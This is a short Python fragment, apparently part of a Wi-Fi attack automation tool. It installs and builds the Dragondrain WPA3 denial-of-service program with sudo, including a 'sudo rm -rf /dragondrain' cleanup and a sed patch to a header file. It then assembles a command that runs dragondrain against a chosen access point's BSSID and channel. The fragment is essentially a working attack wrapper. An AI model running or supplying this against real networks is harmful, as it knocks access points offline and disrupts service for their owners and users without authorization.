...
INSTALL_COMMANDS = [
    ...
    "sudo rm -rf /dragondrain",
    "sudo git clone https://github.com/vanhoefm/dragondrain-and-time.git /dragondrain",
    "cd /dragondrain && sudo autoreconf -i", 
    "cd /dragondrain && sudo ./autogen.sh", 
    "cd /dragondrain && sudo ./configure",
    "sudo sed -i '42s/ __packed//' /dragondrain/src/aircrack-osdep/radiotap/radiotap.h",
    "cd /dragondrain && sudo make"
]
...
def run_final_command(bssid, channel, interface):
    ...
    final_command = f"sudo /dragondrain/src/dragondrain -d {interface} -a {bssid} -c {channel} -b 54 -n 20 -r 200"
